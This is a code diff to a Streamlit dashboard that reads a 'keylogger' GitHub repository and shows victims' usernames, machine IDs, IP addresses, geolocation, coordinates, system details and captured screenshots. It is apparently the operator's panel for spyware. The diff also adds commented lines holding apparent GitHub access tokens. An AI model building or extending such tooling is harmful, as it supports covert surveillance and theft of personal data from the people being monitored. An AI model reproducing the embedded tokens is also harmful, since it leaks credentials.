@@ -21,6 +21,9 @@ CONFIG_BASE_URL = "https://raw.githubusercontent.com/bebedudu/keylogger/refs/hea
 
 # Use Streamlit secrets for GitHub token
 GITHUB_TOKEN = st.secrets["GITHUB_TOKEN"]
+
+# GITHUB_TOKEN = "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"
+# GITHUB_TOKEN = st.secrets["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"]
 last_line = 10 # Number of lines to fetch
 cache_time = 1  # Cache time in seconds
 last_screenshot = 30  # Number of screenshots to fetch
@@ -54,6 +57,10 @@ def fetch_last_10_lines_private(url, token):
 
 # Function to safely parse System Info
 def preprocess_system_info(system_info_str):
+    """
+    Preprocesses the system info string by replacing unsupported objects (like sdiskpart)
+    with a placeholder or simplified representation.
+    """
     system_info_str = re.sub(r"sdiskpart\(.*?\)", "'Disk Partition'", system_info_str)  # Replace sdiskpart objects
     try:
         system_info = ast.literal_eval(system_info_str)
@@ -66,44 +73,84 @@ def preprocess_system_info(system_info_str):
 def parse_active_user_info(lines):
     active_user_data = []
     for line in lines:
-        match = re.search(r"User: (?P<username>.*?), IP: (?P<ip>.*?), Location: (?P<location>.*?), Org: (?P<org>.*?), Coordinates: (?P<coordinates>.*?), Postal: (?P<Postal>.*?),", line)
+        match = re.search(r"User: (?P<username>.*?), Unique_ID: (?P<Unique_ID>.*?), IP: (?P<ip>.*?), Location: (?P<location>.*?), Org: (?P<org>.*?), Coordinates: (?P<coordinates>.*?), Postal: (?P<Postal>.*?),", line
+        )
         if match:
-            active_user_data.append(match.groupdict())
+            user_data = match.groupdict()
+            # Combine username and Unique_ID into a single field
+            # user_data["username"] = f"{user_data['username']}_{user_data['Unique_ID']}"
+            # active_user_data.append(user_data)
+            
+            # Extract the first two characters of the location
+            location_prefix = user_data["location"][:2]
+            # Combine location prefix, username, and Unique_ID into the user field
+            user_data["username"] = f"{user_data['username']}_{location_prefix}_{user_data['Unique_ID']}"
+            active_user_data.append(user_data)
     return active_user_data
 
+
 # Function to parse user info
+# def parse_user_info(lines):
+#     user_data = []
+#     for line in lines:
+#         # Extract the timestamp
+#         timestamp_match = re.search(r"^(?P<timestamp>\d{4}-\d{2}-\d{2} \d{2}:\d{2}:\d{2})", line)
+#         username_match = re.search(r"User: (?P<username>[^\s,]+)", line)
+#         ip_match = re.search(r"IP: (?P<ip>[^\s,]+)", line)
+#         location_match = re.search(r"Location: (?P<location>[^,]+(?:, [^,]+)+)", line)
+#         org_match = re.search(r"Org: (?P<org>[^,]+)", line)
+#         coordinates_match = re.search(r"Coordinates: (?P<coordinates>[^\s,]+)", line)
+#         system_info_match = re.search(r"System Info: (?P<system_info>\{.*\})", line)
+
+#         if username_match and ip_match:
+#             user_info = {
+#                 "timestamp": timestamp_match.group("timestamp") if timestamp_match else "N/A",
+#                 "username": username_match.group("username"),
+#                 "ip": ip_match.group("ip"),
+#                 "location": location_match.group("location") if location_match else "Unknown",
+#                 "org": org_match.group("org") if org_match else "Unknown",
+#                 "coordinates": coordinates_match.group("coordinates") if coordinates_match else "Unknown",
+#             }
+#             # Parse system info safely
+#             if system_info_match:
+#                 try:
+#                     user_info["system_info"] = eval(system_info_match.group("system_info"), {"sdiskpart": dict})
+#                 except Exception:
+#                     user_info["system_info"] = {}
+
+#             user_data.append(user_info)
+
+#     return user_data
+
 def parse_user_info(lines):
     user_data = []
     for line in lines:
-        # Extract the timestamp
-        timestamp_match = re.search(r"^(?P<timestamp>\d{4}-\d{2}-\d{2} \d{2}:\d{2}:\d{2})", line)
-        username_match = re.search(r"User: (?P<username>[^\s,]+)", line)
-        ip_match = re.search(r"IP: (?P<ip>[^\s,]+)", line)
-        location_match = re.search(r"Location: (?P<location>[^,]+(?:, [^,]+)+)", line)
-        org_match = re.search(r"Org: (?P<org>[^,]+)", line)
-        coordinates_match = re.search(r"Coordinates: (?P<coordinates>[^\s,]+)", line)
-        system_info_match = re.search(r"System Info: (?P<system_info>\{.*\})", line)
-
-        if username_match and ip_match:
-            user_info = {
-                "timestamp": timestamp_match.group("timestamp") if timestamp_match else "N/A",
-                "username": username_match.group("username"),
-                "ip": ip_match.group("ip"),
-                "location": location_match.group("location") if location_match else "Unknown",
-                "org": org_match.group("org") if org_match else "Unknown",
-                "coordinates": coordinates_match.group("coordinates") if coordinates_match else "Unknown",
-            }
-            # Parse system info safely
-            if system_info_match:
-                try:
-                    user_info["system_info"] = eval(system_info_match.group("system_info"), {"sdiskpart": dict})
-                except Exception:
-                    user_info["system_info"] = {}
-
-            user_data.append(user_info)
-
+        user_info = {}
+        user_info["raw"] = line
+        
+        timestamp_match = re.match(r"^(?P<timestamp>[\d-]+ [\d:]+) -", line)
+        if timestamp_match:
+            user_info["timestamp"] = timestamp_match.group("timestamp")
+            
+        match = re.search(
+            r"User: (?P<username>.*?), IP: (?P<ip>.*?), Location: (?P<location>.*?), Org: (?P<org>.*?), Coordinates: (?P<coordinates>.*?),",
+            line
+        )
+        if match:
+            user_info.update(match.groupdict())
+            
+            # Add location prefix to the user field
+            location_prefix = user_info["location"][:2]  # Extract first 2 characters of location
+            user_info["username"] = f"{location_prefix}_{user_info['username']}"  # Add location prefix to username
+        
+        # Extract system info details
+        system_info_match = re.search(r"System Info: (?P<system_info>{.*})", line)
+        if system_info_match:
+            system_info_str = system_info_match.group("system_info")
+            user_info["system_info"] = preprocess_system_info(system_info_str)
+        
+        user_data.append(user_info)
     return user_data
-
 
 
 # Function to fetch config file details from the private repository
@@ -120,7 +167,7 @@ def fetch_config_files():
             if filename.endswith("_config.json"):
                 try: # 20250123_142553_dsah8_config.json
                     parts = filename.split("_")
-                    user = parts[2]
+                    user = parts[2] + parts[3]
                     timestamp = datetime.strptime(parts[0] + parts[1], "%Y%m%d%H%M%S")
                     url = file["download_url"]  # Use the raw URL for downloading content
                     config_data.append({"user": user, "timestamp": timestamp, "url": url})
@@ -185,13 +232,15 @@ def fetch_screenshots():
             if file["name"].endswith(".png"):
                 try: 
                     # 20250123_141302_bibek_screenshot_2025-01-23_14-12-19.png
+                    # 20250125_124537_bibek_4C4C4544-0033-3910-804A-B3C04F324233_screenshot_2025-01-25_12-45-12.png
                     # Split the filename to extract details
                     name_parts = file["name"].split("_")
                     if len(name_parts) < 3:  # Ensure enough parts for parsing
                         st.warning(f"Skipping improperly formatted file: {file['name']}")
                         continue
                     date_time = name_parts[0] + name_parts[1]  # YYYYMMDD + HHMMSS
-                    user = name_parts[2]  # Extract user name
+                    # user = name_parts[2]  # Extract user name
+                    user = name_parts[2]+ name_parts[3]  # Extract user name
                     date_time = name_parts[0] + name_parts[1]  # Combine YYYYMMDD and HHMMSS
                     timestamp = datetime.strptime(date_time, "%Y%m%d%H%M%S")  # Parse into a datetime object
                     screenshots.append({
@@ -321,14 +370,16 @@ def dashboard():
         df["city"] = df["location"].apply(lambda loc: loc.split(",")[1].strip() if "," in loc else "Unknown")
         df["country"] = df["location"].apply(lambda loc: loc.split(",")[0].strip() if "," in loc else "Unknown")
         
-        # Display details of filtered users
+        # Display details of filtered users (details of active user)
         st.title("Active User Dashboard")
         st.write(f"### Active Users: {len(filtered_users)}")
         for user in filtered_users:
             # Use the extracted timestamp
-            timestamp = user["timestamp"]
+            # timestamp = user["timestamp"]
             
-            with st.expander(f"Details for User: {user['username']} (IP: {user['ip']}, Last Active: {timestamp})"):
+            # with st.expander(f"Details for User: {user['username']} (IP: {user['ip']}, Last Active: {timestamp})"):
+            with st.expander(f"Details for User: {user['username']} (Last Active: {user['timestamp']})"):
+                st.write(f"**Timestamp:** {user.get('timestamp', 'N/A')}")
                 st.write(f"**Location:** {user['location']}")
                 st.write(f"**Organization:** {user['org']}")
                 st.write(f"**Coordinates:** {user['coordinates']}")
